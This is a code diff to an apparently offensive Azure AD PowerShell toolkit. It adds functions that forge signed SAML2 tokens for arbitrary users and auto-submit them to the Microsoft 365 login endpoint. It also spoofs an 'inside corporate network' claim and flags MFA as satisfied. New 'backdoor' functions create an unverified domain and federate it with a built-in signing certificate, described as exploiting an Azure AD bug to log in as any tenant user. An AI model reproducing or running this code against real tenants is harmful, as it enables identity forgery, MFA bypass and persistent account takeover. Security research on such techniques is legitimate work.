@@ -108,6 +108,9 @@ function New-SAMLToken
         {
             $statement.Attributes.Add((New-Object System.IdentityModel.Tokens.SamlAttribute("http://schemas.microsoft.com/claims","authnmethodsreferences",[string[]]@("http://schemas.microsoft.com/claims/multipleauthn"))))
         }
+        # Inside company network
+        $statement.Attributes.Add((New-Object System.IdentityModel.Tokens.SamlAttribute("http://schemas.microsoft.com/ws/2012/01/","insidecorporatenetwork",[string[]]@("True"))))
+        
         $statement.SamlSubject = $subject
 
         $assertion.Statements.Add($statement)
@@ -124,6 +127,150 @@ function New-SAMLToken
 
         # Convert to XML
         $handler = New-Object System.IdentityModel.Tokens.SamlSecurityTokenHandler
+        $writer = New-Object System.IO.StringWriter
+        $handler.WriteToken((New-Object System.Xml.XmlTextWriter($writer)), $token)
+        $strToken=$writer.ToString()
+
+        return $strToken
+     }
+}
+
+# Creates a SAML token
+function New-SAML2Token
+{
+<#
+    .SYNOPSIS
+    Creates a SAML token
+
+    .DESCRIPTION
+    Creates a valid SAML token for given user
+
+    .Parameter UserName
+    User Principal Name (UPN) of the user. Not used by AAD Identity Federation so can be any email address.
+
+    .Parameter ImmutableID
+    Immutable ID of the user. For synced users, this is user's AD object GUID encoded in B64.
+    For non-synced users this must be set manually, can be any unique string within the tenant.
+    User doesn't have to federated user.
+
+    .Parameter Issuer
+    Issuer identification of Identity Provider (IdP). Usually this is a FQDN of the ADFS server, but can be any
+    unique string within Azure AD. Must match federation information of validated domain in the tenant.
+
+    .Parameter Certificate
+    A X509 certificate used to sign the SAML token. Must match federation information of validated domain in the tenant.
+
+    .Parameter PfxFileName
+    The full path to .pfx file from where to load the certificate
+
+    .Parameter PfxPassword
+    The password of the .pfx file
+    
+    .Example
+    PS C:\>New-AADIntSAML2Token -ImmutableId "Ah2J42BsPUOBoUcsCYn7vA==" -Issuer "http://mysts.company.com/adfs/ls" -PfxFileName "MyCert.pfx" -PfxPassword -Password "mypassword"
+
+    .Example
+    PS C:\>$cert=Get-AADIntCertificate -FileName "MyCert.pfx" -Password "mypassword"
+    PS C:\>New-AADIntSAML2Token -ImmutableId "Ah2J42BsPUOBoUcsCYn7vA==" -Issuer "http://mysts.company.com/adfs/ls" -Certificate $cert
+
+#>
+    [cmdletbinding()]
+    Param(
+        [Parameter(Mandatory=$False)]
+        [String]$UserName="joulupukki@korvatunturi.fi", # Not used in AAD identity federation, defaults to Santa Claus ;)
+        [Parameter(Mandatory=$True)]
+        [String]$ImmutableID,
+        [Parameter(Mandatory=$True)]
+        [String]$Issuer,
+
+        [Parameter(Mandatory=$False)]
+        [String]$InResponseTo,
+
+        [Parameter(ParameterSetName='UseAnySTS',Mandatory=$True)]
+        [switch]$UseBuiltInCertificate,
+
+        [Parameter(ParameterSetName='Certificate',Mandatory=$True)]
+        [System.Security.Cryptography.X509Certificates.X509Certificate2]$Certificate,
+
+        [Parameter(ParameterSetName='FileAndPassword',Mandatory=$True)]
+        [string]$PfxFileName,
+        [Parameter(ParameterSetName='FileAndPassword',Mandatory=$False)]
+        [string]$PfxPassword
+
+
+    )
+    Process
+    {
+        # Do we use built-in certificate (any.sts)
+        if($UseBuiltInCertificate)
+        {
+            $Certificate = Get-Certificate -FileName "$PSScriptRoot\any_sts.pfx" -Password ""
+        }
+        elseif($Certificate -eq $null) # Load the ceftificate
+        {
+            $Certificate = Get-Certificate -FileName $PfxFileName -Password $PfxPassword
+        }
+
+        if([String]::IsNullOrEmpty($InResponseTo))
+        {
+            $InResponseTo = "_$((New-Guid).ToString())";
+        }
+
+        # Import the assemblies
+        Add-Type -AssemblyName 'System.IdentityModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'
+
+        $now = (get-date).ToUniversalTime()
+        
+        # Create a new SAML2 assertion
+        $identifier = New-Object System.IdentityModel.Tokens.Saml2NameIdentifier($Issuer)
+        $assertion = New-Object  System.IdentityModel.Tokens.Saml2Assertion($identifier)
+        
+        # Set id, time, and issuer
+        $assertion.Id = "_$((New-Guid).ToString())"
+        $assertion.IssueInstant = $now
+        
+        # Create subject and related objects
+        $subject = New-Object System.IdentityModel.Tokens.Saml2Subject
+        $subject.NameId = New-Object System.IdentityModel.Tokens.Saml2NameIdentifier($ImmutableID)
+        $subject.NameId.Format = New-Object System.Uri("urn:oasis:names:tc:SAML:2.0:nameid-format:persistent")
+        $confirmationData = New-Object System.IdentityModel.Tokens.Saml2SubjectConfirmationData
+        $confirmationData.InResponseTo = New-Object System.IdentityModel.Tokens.Saml2Id($InResponseTo)
+        $confirmationData.NotOnOrAfter = $now.AddHours(1)
+        $confirmationData.Recipient = New-Object System.uri("https://login.microsoftonline.com/login.srf")
+        $confirmation = New-Object System.IdentityModel.Tokens.Saml2SubjectConfirmation(New-Object System.Uri("urn:oasis:names:tc:SAML:2.0:cm:bearer"))#, $confirmationData)
+        $confirmation.SubjectConfirmationData = $confirmationData
+        $subject.SubjectConfirmations.Add($confirmation)
+        $assertion.Subject = $subject
+
+        # Create condition and audience objects
+        $conditions = New-Object System.IdentityModel.Tokens.Saml2Conditions
+        $conditions.NotBefore = $now
+        $conditions.NotOnOrAfter = $now.AddHours(1)
+        $conditions.AudienceRestrictions.Add((New-Object System.IdentityModel.Tokens.Saml2AudienceRestriction(New-Object System.Uri("urn:federation:MicrosoftOnline", [System.UriKind]::RelativeOrAbsolute))))
+        $assertion.Conditions = $conditions
+
+        # Add statements
+        $attrUPN = New-Object System.IdentityModel.Tokens.Saml2Attribute("IDPEmail",$UserName)
+        $statement = New-Object System.IdentityModel.Tokens.Saml2AttributeStatement
+        $statement.Attributes.Add($attrUPN)
+        $assertion.Statements.Add($statement)
+        $authenticationContext = New-Object System.IdentityModel.Tokens.Saml2AuthenticationContext(New-Object System.Uri("urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport"))
+        $authenticationStatement = New-Object System.IdentityModel.Tokens.Saml2AuthenticationStatement($authenticationContext)
+        $authenticationStatement.AuthenticationInstant = $now
+        $authenticationStatement.SessionIndex = $assertion.Id.Value
+        $assertion.Statements.Add($authenticationStatement)
+
+        
+
+        # Sign the assertion
+        $ski = New-Object System.IdentityModel.Tokens.SecurityKeyIdentifier((New-Object System.IdentityModel.Tokens.X509RawDataKeyIdentifierClause($Certificate))) 
+        $assertion.SigningCredentials = New-Object System.IdentityModel.Tokens.SigningCredentials((New-Object System.IdentityModel.Tokens.X509AsymmetricSecurityKey($Certificate)), [System.IdentityModel.Tokens.SecurityAlgorithms]::RsaSha1Signature, [System.IdentityModel.Tokens.SecurityAlgorithms]::Sha1Digest, $ski )
+
+        # Create a SAML token
+        $token = New-Object System.IdentityModel.Tokens.Saml2SecurityToken($assertion)
+
+        # Convert to XML
+        $handler = New-Object System.IdentityModel.Tokens.Saml2SecurityTokenHandler
         $writer = New-Object System.IO.StringWriter
         $handler.WriteToken((New-Object System.Xml.XmlTextWriter($writer)), $token)
         $strToken=$writer.ToString()
@@ -162,6 +309,33 @@ function New-WSFedResponse
             <t:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</t:RequestType>
             <t:KeyType>http://schemas.xmlsoap.org/ws/2005/05/identity/NoProofKey</t:KeyType>
         </t:RequestSecurityTokenResponse>
+"@
+
+        return $response
+    }
+}
+
+# Create SAML-P response
+function New-SAMLPResponse
+{
+    [cmdletbinding()]
+    Param(
+        [Parameter(Mandatory=$True)]
+        [String]$SAML2Token
+    )
+    Process
+    {
+
+        # Create the Request Security Token Response
+        $response=@"
+        <samlp:Response ID="_$((New-Guid).ToString())" Version="2.0" IssueInstant="$((Get-Date).toString('s'))Z" Destination="https://login.microsoftonline.com/login.srf" Consent="urn:oasis:names:tc:SAML:2.0:consent:unspecified" InResponseTo="$InResponseTo" xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
+            <Issuer xmlns="urn:oasis:names:tc:SAML:2.0:assertion">$Issuer</Issuer>
+            <samlp:Status>
+                <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success" />
+            </samlp:Status>
+            $SAML2Token
+        </samlp:Response>
+               
 "@
 
         return $response
@@ -266,6 +440,8 @@ function Open-Office365Portal
         [String]$Issuer,
         [Parameter(Mandatory=$False)]
         [bool]$ByPassMFA=$true,
+        [ValidateSet('WSFED','SAMLP')]
+        $TokenType="WSFED",
         [Parameter(ParameterSetName='UseAnySTS',Mandatory=$True)]
         [switch]$UseBuiltInCertificate,
         [Parameter(ParameterSetName='Certificate',Mandatory=$True)]
@@ -288,24 +464,52 @@ function Open-Office365Portal
             $Certificate = Get-Certificate -FileName $PfxFileName -Password $PfxPassword
         }
 
-        # Create SAML token and WSFED response
-        $token=New-SAMLToken -UserName $UserName -ImmutableID $ImmutableId -Issuer $Issuer -Certificate $Certificate
-        $wsfed=New-WSFedResponse -SAMLToken $token
+        $form=""
 
-        # Create a login form
-        $form=@"
-        <html>
-            <head><title>AADInternals Office 365 login form</title></head>
-            <body onload="document.forms['login'].submit()">
-                <form action="https://login.microsoftonline.com/login.srf" method="post" name="login">
-                    <input name="wa" type="hidden" value="wsignin1.0" />
-                    <input name="wctx" type="hidden" value="" />
-                    <input name="wresult" type="hidden" value="$([System.Net.WebUtility]::HtmlEncode($wsfed))">
-                    To login automatically, the javascript needs to be enabled.. So just click the button! <br>
-                    <button type="submit">Login to Office 365</button>                </form>
-            </body>
-        </html>
+        if($TokenType -eq "WSFED")
+        {
+            # Create SAML token and WSFED response
+            $token=New-SAMLToken -UserName $UserName -ImmutableID $ImmutableId -Issuer $Issuer -Certificate $Certificate
+            $wsfed=New-WSFedResponse -SAMLToken $token
+
+            # Create a login form
+            $form=@"
+            <html>
+                <head><title>AADInternals Office 365 login form</title></head>
+                <body onload="document.forms['login'].submit()">
+                    <form action="https://login.microsoftonline.com/login.srf" method="post" name="login">
+                        <input name="wa" type="hidden" value="wsignin1.0" />
+                        <input name="wctx" type="hidden" value="" />
+                        <input name="wresult" type="hidden" value="$([System.Net.WebUtility]::HtmlEncode($wsfed))">
+                        To login automatically, the javascript needs to be enabled.. So just click the button! <br>
+                        <button type="submit">Login to Office 365</button>                    </form>
+                </body>
+            </html>
 "@
+        }
+        else
+        {
+            # Create SAML2 token and SAMLP response
+            $token=New-SAML2Token -UserName $UserName -ImmutableID $ImmutableId -Issuer $Issuer -Certificate $Certificate
+            $samlp=New-SAMLPResponse -SAML2Token $token
+
+            # Create a login form
+            $form=@"
+            <html>
+                <head><title>AADInternals Office 365 login form</title></head>
+                <body onload="document.forms['login'].submit()">
+                    <form action="https://login.microsoftonline.com/login.srf" method="post">
+                        <input name="RelayState" value="" type="hidden"/>
+                        <input name="SAMLResponse" value="$([Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($samlp)))" type="hidden"/>
+                        To login automatically, the javascript needs to be enabled.. So just click the button! <br>
+                        <button type="submit">Login to Office 365</button>
+                    </form>
+                </body>
+            </html>
+"@
+        }
+
+
         # Create a temporary file
         # TODO: remove the tmp file
         $tmp = New-TemporaryFile
@@ -363,7 +567,7 @@ function Get-ImmutableID
     }
 }
 
-# Creates a backdoor to Azure AD
+# Creates a backdoor to Azure AD by using an existing domain
 function ConvertTo-Backdoor
 {
 <#
@@ -381,6 +585,9 @@ function ConvertTo-Backdoor
 
     .Parameter DomainName
     The domain to be used as a backdoor
+
+    .Parameter Create
+    If set, tries to create the domain
     
     .Example
     PS C:\>ConvertTo-AADIntBackdoor -DomainName backdoor.myo365.site
@@ -391,7 +598,9 @@ function ConvertTo-Backdoor
         [Parameter(Mandatory=$False)]
         [String]$AccessToken,
         [Parameter(Mandatory=$True)]
-        [String]$DomainName
+        [String]$DomainName,
+        [Parameter(Mandatory=$False)]
+        [switch]$Create
     )
     Process
     {
@@ -402,13 +611,29 @@ function ConvertTo-Backdoor
         $tenant_id = Get-TenantId -AccessToken $AccessToken
 
         $LogOnOffUri ="https://sts.0nmicrosoft.com/$tenant_id"
-        $IssuerUri = "http://sts.0nmicrosoft.com/$tenant_id"
+        $IssuerUri = "http://sts.0nmicrosoft.com/$tenant_id/$DomainName"
 
         $input = read-host "Are you sure to create backdoor with $DomainName`? Type YES to continue or CTRL+C to abort"
         switch ($input) `
         {
             "yes" {
-                Set-DomainAuthentication -Authentication Federated -AccessToken $AccessToken -DomainName $DomainName -LogOffUri $LogOnOffUri -PassiveLogOnUri $LogOnOffUri -IssuerUri $IssuerUri -SigningCertificate $any_sts
+                # Tries to create a new unvalidated domain
+                if($Create)
+                {
+                    New-Domain -AccessToken $AccessToken -Name $DomainName 
+
+                    # We need to wait a while for the domain to be created..
+                    $seconds = 10
+                    $done = (Get-Date).AddSeconds($seconds)
+                    while($done -gt (Get-Date)) {
+                        $secondsLeft = $done.Subtract((Get-Date)).TotalSeconds
+                        $percent = ($seconds - $secondsLeft) / $seconds * 100
+                        Write-Progress -Activity "Waiting" -Status "Waiting $seconds seconds for the domain to be ready..." -SecondsRemaining $secondsLeft -PercentComplete $percent
+                        [System.Threading.Thread]::Sleep(500)
+                    }
+                    Write-Progress -Activity "Waiting" -Status "Waiting $seconds seconds for the domain to be ready..." -SecondsRemaining 0 -Completed
+                }
+                Set-DomainAuthentication -Authentication Federated -AccessToken $AccessToken -DomainName $DomainName -LogOffUri $LogOnOffUri -PassiveLogOnUri $LogOnOffUri -IssuerUri $IssuerUri -SigningCertificate $any_sts -SupportsMfa $true
                 Write-Host "Backdoor created. Domain: $DomainName, issuer=$IssuerUri" -ForegroundColor DarkBlue -BackgroundColor White
             }
 
@@ -416,6 +641,49 @@ function ConvertTo-Backdoor
                 write-host "Aborted" -ForegroundColor Red
             }
         }
+
+    }
+}
+
+# Creates a backdoor to Azure AD
+# 03.02.2019
+function New-Backdoor
+{
+<#
+    .SYNOPSIS
+    Creates a new backdoor to Azure AD tenant.
+
+    .DESCRIPTION
+    Creates a new backdoor to Azure tenant by creating a new domain and by altering its authentication settings.
+    Allows logging in as any user of the tenant.
+
+    The certificate will be configured to be any.sts and issuer http://sts.0nmicrosoft.com/<tenant id>
+
+    Utilises a bug in Azure AD, which allows convering unverified domains to federated.
+
+    .Parameter AccessToken
+    Access Token
+
+    .Parameter DomainName
+    The domain to be created to be used as a backdoor. If not given, uses default.onmicrosoft.com.
+    
+    .Example
+    PS C:\>New-AADIntBackdoor -DomainName backdoor.myo365.site
+
+#>
+    [cmdletbinding()]
+    Param(
+        [Parameter(Mandatory=$False)]
+        [String]$AccessToken,
+        [Parameter(Mandatory=$False)]
+        [String]$DomainName="sts.onmicrosoft.com"
+    )
+    Process
+    {
+        # Get from cache if not provided
+        $AccessToken = Get-AccessTokenFromCache($AccessToken)
+
+        ConvertTo-Backdoor -AccessToken $AccessToken -DomainName $DomainName -Create
 
     }
 }
